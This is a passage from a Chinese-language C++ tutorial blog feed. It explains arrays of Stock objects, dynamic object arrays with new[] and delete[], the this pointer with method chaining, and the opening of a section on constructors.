class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用初始化列表创建并初始化数组</span></span><br><span class="line">    Stock stocks[STKS] = &#123;</span><br><span class="line">        Stock(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">200</span>, <span class="number">2.0</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Monolithic Obelisks&quot;</span>, <span class="number">130</span>, <span class="number">3.25</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Fleep Enterprises&quot;</span>, <span class="number">60</span>, <span class="number">6.5</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stock holdings:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> st;</span><br><span class="line">    <span class="keyword">for</span> (st = <span class="number">0</span>; st &lt; STKS; st++) &#123;</span><br><span class="line">        stocks[st].show(); <span class="comment">// 调用数组中第 st 个对象的 show() 方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到价值最高的股票 (使用上一节的 topval 假设它已添加)</span></span><br><span class="line">    <span class="comment">// 注意：topval 需要添加到 Stock 类中才能编译</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    const Stock* top = &amp;stocks[0]; // 假设第一个是最高的</span></span><br><span class="line"><span class="comment">    for (st = 1; st &lt; STKS; st++) &#123;</span></span><br><span class="line"><span class="comment">        top = &amp;top-&gt;topval(stocks[st]); // 比较并更新 top 指针</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    std::cout &lt;&lt; &quot;\nMost valuable holding:\n&quot;;</span></span><br><span class="line"><span class="comment">    top-&gt;show(); // 显示价值最高的股票信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改数组中某个对象的状态</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBuying more Boffo Objects...\n&quot;</span>;</span><br><span class="line">    stocks[<span class="number">1</span>].buy(<span class="number">50</span>, <span class="number">2.5</span>); <span class="comment">// 调用 stocks[1] 对象的 buy() 方法</span></span><br><span class="line">    stocks[<span class="number">1</span>].show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>输出示例 (假设 <code>topval</code> 部分被注释掉):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Constructor using NanoSmart called</span><br><span class="line">Constructor using Boffo Objects called</span><br><span class="line">Constructor using Monolithic Obelisks called</span><br><span class="line">Constructor using Fleep Enterprises called</span><br><span class="line">Stock holdings:</span><br><span class="line">Company: NanoSmart  Shares: 12</span><br><span class="line">  Share Price: $20.000  Total Worth: $240.00</span><br><span class="line">Company: Boffo Objects  Shares: 200</span><br><span class="line">  Share Price: $2.000  Total Worth: $400.00</span><br><span class="line">Company: Monolithic Obelisks  Shares: 130</span><br><span class="line">  Share Price: $3.250  Total Worth: $422.50</span><br><span class="line">Company: Fleep Enterprises  Shares: 60</span><br><span class="line">  Share Price: $6.500  Total Worth: $390.00</span><br><span class="line"></span><br><span class="line">Buying more Boffo Objects...</span><br><span class="line">Company: Boffo Objects  Shares: 250</span><br><span class="line">  Share Price: $2.500  Total Worth: $625.00</span><br><span class="line">Bye, Fleep Enterprises!</span><br><span class="line">Bye, Monolithic Obelisks!</span><br><span class="line">Bye, Boffo Objects!</span><br><span class="line">Bye, NanoSmart!</span><br></pre></td></tr></table></figure><p>注意：程序结束时，数组 <code>stocks</code> 中的每个对象的析构函数都会被调用（按与构造相反的顺序）。</p><h2 id="动态对象数组"><a href="#动态对象数组" class="headerlink" title="动态对象数组"></a>动态对象数组</h2><p>你也可以使用 <code>new</code> 来创建动态的对象数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="number">5</span>;</span><br><span class="line">Stock *portfolio = <span class="keyword">new</span> Stock[size]; <span class="comment">// 创建包含 5 个 Stock 对象的动态数组</span></span><br></pre></td></tr></table></figure><ul><li><p>  <strong>默认构造函数要求:</strong> 使用 <code>new ClassName[size]</code> 这种形式时，<strong>必须</strong>要求类具有可访问的<strong>默认构造函数</strong>，因为它会为数组中的每个元素调用默认构造函数。</p></li><li><p><strong>C++11 列表初始化 (可选):</strong> C++11 允许在使用 <code>new</code> 创建数组时提供初始化列表，这样可以调用特定的构造函数，并且如果提供了所有元素的初始化值，则不强制要求默认构造函数。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++11 or later</span></span><br><span class="line">Stock *p_list = <span class="keyword">new</span> Stock[<span class="number">3</span>] &#123;</span><br><span class="line">    Stock(<span class="string">&quot;X Inc&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;Y Ltd&quot;</span>, <span class="number">2</span>, <span class="number">2.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;Z LLC&quot;</span>, <span class="number">3</span>, <span class="number">3.0</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Stock *p_partial = <span class="keyword">new</span> Stock[<span class="number">4</span>] &#123;</span><br><span class="line">    Stock(<span class="string">&quot;A&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;B&quot;</span>, <span class="number">2</span>, <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment">// p_partial[2] 和 p_partial[3] 需要默认构造函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>  <strong>访问:</strong> 访问动态数组成员可以使用数组表示法 <code>portfolio[i].member</code> 或指针表示法 <code>(portfolio + i)-&gt;member</code>。</p></li><li><p><strong>释放内存:</strong> 必须使用 <code>delete []</code> 来释放动态分配的对象数组，以确保每个对象的析构函数都被正确调用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [] portfolio; <span class="comment">// 调用 5 次析构函数，然后释放内存</span></span><br><span class="line"><span class="keyword">delete</span> [] p_list;</span><br><span class="line"><span class="keyword">delete</span> [] p_partial;</span><br></pre></td></tr></table></figure><p>  <strong>错误:</strong> 使用 <code>delete portfolio;</code> 只会调用第一个元素的析构函数，并可能导致内存泄漏或未定义行为。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>  可以像创建基本类型数组一样创建对象数组。</li><li>  创建对象数组时，会为每个元素调用构造函数。</li><li>  如果未提供显式初始化，则调用默认构造函数。因此，对于未初始化的数组或使用 <code>new ClassName[size]</code> 创建的动态数组，类必须有可访问的默认构造函数。</li><li>  可以使用初始化列表为数组成员指定不同的构造函数。</li><li>  通过 <code>arrayName[index].member</code> 的方式访问数组成员。</li><li>  动态对象数组使用 <code>new ClassName[size]</code> 创建，并必须使用 <code>delete [] arrayPtr</code> 释放。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.4 this 指针</title>
      <link href="2025/04/26/10.4_this_%E6%8C%87%E9%92%88/"/>
      <url>2025/04/26/10.4_this_%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<p>在 C++ 类的成员函数内部，你有时可能需要引用<strong>调用该函数的对象本身</strong>。例如，当你在 <code>stock1.show()</code> 的实现代码中，如何明确地指代 <code>stock1</code> 这个对象？C++ 为此提供了一个特殊的指针，称为 <code>this</code> 指针。</p><h2 id="this-指针是什么？"><a href="#this-指针是什么？" class="headerlink" title="this 指针是什么？"></a><code>this</code> 指针是什么？</h2><p><code>this</code> 是一个隐含的指针，它存在于每个<strong>非静态成员函数</strong>（non-static member function）内部。它指向<strong>调用该成员函数的那个对象</strong>。</p><ul><li>  当你调用 <code>stock1.show()</code> 时，在 <code>show()</code> 函数的内部，<code>this</code> 指针就指向 <code>stock1</code> 对象。</li><li>  当你调用 <code>stock2.buy(..)</code> 时，在 <code>buy()</code> 函数的内部，<code>this</code> 指针就指向 <code>stock2</code> 对象。</li></ul><p>编译器在调用成员函数时，会隐式地将对象的地址传递给该函数，这个地址就被 <code>this</code> 指针所持有。</p><p><strong>关键点：</strong></p><ol><li> <strong>隐含参数:</strong> <code>this</code> 指针是作为隐含参数传递给非静态成员函数的。你不需要在函数参数列表中显式声明它。</li><li> <strong>指向调用对象:</strong> 它总是指向当前正在执行其成员函数的那个对象。</li><li> <strong>类型:</strong> <code>this</code> 指针的类型是 <code>ClassName * const</code>（对于非 <code>const</code> 成员函数）或 <code>const ClassName * const</code>（对于 <code>const</code> 成员函数）。这意味着 <code>this</code> 指针本身是一个常量指针（不能让它指向其他对象），并且对于 <code>const</code> 成员函数，它指向一个 <code>const</code> 对象（不能通过 <code>this</code> 修改对象的数据成员）。</li><li> <strong>访问成员:</strong> 在成员函数内部，当你直接访问数据成员（如 <code>shares</code>）或调用其他成员函数（如 <code>set_tot()</code>）时，实际上是编译器隐式地使用了 <code>this</code> 指针，等同于 <code>this-&gt;shares</code> 或 <code>this-&gt;set_tot()</code>。</li></ol><h2 id="使用-this-指针"><a href="#使用-this-指针" class="headerlink" title="使用 this 指针"></a>使用 <code>this</code> 指针</h2><p>大多数情况下，你不需要显式地使用 <code>this</code> 指针，因为编译器会自动处理。例如，在 <code>Stock::buy</code> 函数中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// shares += num;       // 隐式使用 this-&gt;shares</span></span><br><span class="line">        <span class="comment">// share_val = price; // 隐式使用 this-&gt;share_val</span></span><br><span class="line">        <span class="comment">// set_tot();         // 隐式调用 this-&gt;set_tot()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面是显式使用 this 的等效写法：</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;shares += num;</span><br><span class="line">        <span class="keyword">this</span>-&gt;share_val = price;</span><br><span class="line">        <span class="keyword">this</span>-&gt;set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而，在某些特定场景下，显式使用 <code>this</code> 指针是必要的或有用的：</p><ol><li><p><strong>区分同名参数和成员:</strong> 当成员函数的参数名与数据成员名相同时，需要使用 <code>this-&gt;</code> 来明确指定访问的是数据成员。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 参数名 value 与数据成员 value 相同</span></span><br><span class="line">    Example(<span class="keyword">int</span> value) &#123;</span><br><span class="line">        <span class="comment">// 必须使用 this-&gt;value 来引用数据成员</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;value = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125; <span class="comment">// 这里访问的是成员 value</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Example <span class="title">ex</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 调用构造函数</span></span><br><span class="line">    ex.print();     <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <em>(虽然这种命名方式有时会用到，但一些编码规范建议避免参数名和成员名完全相同，例如使用 <code>m_value</code> 或 <code>value_</code> 作为成员名)</em></p></li><li><p><strong>返回对象自身的引用或指针:</strong> 当成员函数需要返回调用该函数的对象本身时（通常是为了支持**方法链式调用 (Method Chaining)**）。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Counter&amp; <span class="title">increment</span><span class="params">()</span> </span>&#123; <span class="comment">// 返回类型是 Counter&amp;</span></span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用对象自身的引用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Counter&amp; <span class="title">add</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; <span class="comment">// 返回类型是 Counter&amp;</span></span><br><span class="line">        count += val;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用对象自身的引用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Counter c;</span><br><span class="line">    c.display(); <span class="comment">// Output: Count: 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法链式调用</span></span><br><span class="line">    c.increment().add(<span class="number">5</span>).increment(); <span class="comment">// 先调用 increment(), 返回 c 的引用；</span></span><br><span class="line">                                      <span class="comment">// 再对 c 调用 add(5), 返回 c 的引用；</span></span><br><span class="line">                                      <span class="comment">// 最后对 c 调用 increment()</span></span><br><span class="line"></span><br><span class="line">    c.display(); <span class="comment">// Output: Count: 7</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在 <code>increment()</code> 和 <code>add()</code> 中，<code>return *this;</code> 返回的是调用对象（<code>c</code>）的引用，使得可以在其后继续调用该对象的其他成员函数。</p></li><li><p> <strong>在友元函数或独立函数中传递对象:</strong> 虽然 <code>this</code> 本身只在成员函数内可用，但你可以将 <code>*this</code>（对象本身）或 <code>this</code>（对象地址）传递给需要操作该对象的其他函数。</p></li></ol><h2 id="this-与-Stock-类"><a href="#this-与-Stock-类" class="headerlink" title="this 与 Stock 类"></a><code>this</code> 与 <code>Stock</code> 类</h2><p>让我们看看 <code>this</code> 如何应用于之前的 <code>Stock</code> 类。假设我们想添加一个方法，用于比较两个 <code>Stock</code> 对象的总价值，并返回总价值较高的那个对象的引用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.h 的类定义中添加声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors, destructor, buy, sell, update, show ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新增方法：比较总价值，返回价值更高的对象的引用</span></span><br><span class="line">    <span class="comment">// 第一个const（返回值前）：表示返回的引用是常量，不能被修改</span></span><br><span class="line">    <span class="comment">// 第二个const（参数中）  ：表示参数是常量引用，函数内不能修改参数</span></span><br><span class="line">    <span class="comment">// 第三个const（函数末尾）：表示这是一个常量成员函数，不能修改调用对象的成员变量</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> Stock&amp; <span class="title">topval</span><span class="params">(<span class="keyword">const</span> Stock&amp; s)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 stock.cpp 中添加定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 其他定义 ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 topval 方法</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> Stock&amp; <span class="title">Stock::topval</span><span class="params">(<span class="keyword">const</span> Stock&amp; s)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// this-&gt;total_val 是调用该方法的对象 (e.g., stock1) 的总价值</span></span><br><span class="line">    <span class="comment">// s.total_val 是传入的参数对象 (e.g., stock2) 的总价值</span></span><br><span class="line">    <span class="keyword">if</span> (s.total_val &gt; <span class="keyword">this</span>-&gt;total_val) &#123;</span><br><span class="line">        <span class="keyword">return</span> s; <span class="comment">// 返回传入的对象 s</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// 返回调用该方法的对象自身 (*this)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意：函数声明和定义末尾的 const 表示此函数不会修改任何 Stock 对象，</span></span><br><span class="line">    <span class="comment">// 因此 this 的类型是 const Stock* const，*this 的类型是 const Stock&amp;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用示例</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;Company A&quot;</span>, <span class="number">100</span>, <span class="number">10.0</span>)</span></span>; <span class="comment">// total_val = 1000.0</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Company B&quot;</span>, <span class="number">50</span>, <span class="number">25.0</span>)</span></span>;  <span class="comment">// total_val = 1250.0</span></span><br><span class="line"></span><br><span class="line">    stock1.show();</span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Stock&amp; top = stock1.topval(stock2); <span class="comment">// 调用 stock1.topval，传入 stock2</span></span><br><span class="line">                                              <span class="comment">// 内部比较 s(stock2).total_val 和 this(stock1)-&gt;total_val</span></span><br><span class="line">                                              <span class="comment">// 因为 stock2 价值更高，返回 stock2 的引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nTop value stock:\n&quot;</span>;</span><br><span class="line">    top.show(); <span class="comment">// 显示的是 stock2 的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>this-&gt;total_val</code> 明确表示访问的是调用 <code>topval</code> 函数的那个对象（<code>stock1</code>）的 <code>total_val</code> 成员，而 <code>s.total_val</code> 访问的是作为参数传递进来的对象（<code>stock2</code>）的 <code>total_val</code>。<code>return *this;</code> 则返回了调用对象 <code>stock1</code> 本身的引用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>  <code>this</code> 是一个指向<strong>调用对象</strong>的指针，在非静态成员函数内部可用。</li><li>  它使得成员函数能够访问和操作调用它的那个特定对象的数据成员和成员函数。</li><li>  大多数情况下，<code>this</code> 的使用是隐式的。</li><li>显式使用 <code>this</code> 主要用于：<ul><li>  区分同名的参数和数据成员。</li><li>  从成员函数中返回调用对象自身的引用或指针（常用于方法链）。</li></ul></li><li>  <code>this</code> 指针的类型取决于成员函数是否为 <code>const</code>。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.3 类的构造函数和析构函数</title>
      <link href="2025/04/26/10.3_%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%92%8C%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0/"/>
      <url>2025/04/26/10.3_%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%92%8C%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>在上一节中，我们定义了一个 <code>Stock</code> 类，并通过 <code>acquire()</code> 成员函数来设置其初始状态。然而，C++ 提供了一种更自动化、更专门化的方式来处理对象的初始化和清理工作：<strong>构造函数 (Constructor)</strong> 和 **析构函数 (Destructor)**。</p><h2 id="10-3-1-声明和定义构造函数"><a href="#10-3-1-声明和定义构造函数" class="headerlink" title="10.3.1 声明和定义构造函数"></a>10.3.1 声明和定义构造函数</h2><p><strong>构造函数</strong>是一种特殊的成员函数，它的主要目的是在创建类的对象时<strong>初始化</strong>该对象的数据成员。</p><p><strong>特点与规则:</strong></p><ol><li> <strong>名称与类名相同:</strong> 构造函数的名称必须与它所属的类的名称完全一样。</li><li> <strong>没有返回类型:</strong> 构造函数没有声明返回类型，连 <code>void</code> 也没有。</li><li> <strong>自动调用:</strong> 当创建类的对象时，程序会自动调用相应的构造函数。</li><li> <strong>可以重载:</strong> 一个类可以有多个构造函数，只要它们的参数列表不同（参数个数、类型或顺序不同）。这允许以不同的方式初始化对象。</li></ol><p><strong>声明语法 (在类定义内):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数声明 (无参数)</span></span><br><span class="line">    ClassName();</span><br><span class="line">    <span class="comment">// 构造函数声明 (带参数)</span></span><br><span class="line">    ClassName(ParameterList);</span><br><span class="line">    <span class="comment">// ... 其他成员 ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>定义语法 (在类外部):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无参数构造函数定义</span></span><br><span class="line">ClassName::ClassName() &#123;</span><br><span class="line">    <span class="comment">// 初始化代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数构造函数定义</span></span><br><span class="line">ClassName::ClassName(ParameterList) &#123;</span><br><span class="line">    <span class="comment">// 使用参数进行初始化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：为 <code>Stock</code> 类添加构造函数</strong></p><p>我们可以为 <code>Stock</code> 类添加构造函数来替代之前的 <code>acquire()</code> 函数的部分功能，确保对象在创建时就被赋予有意义的初始值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 stock.h 的类定义中声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span 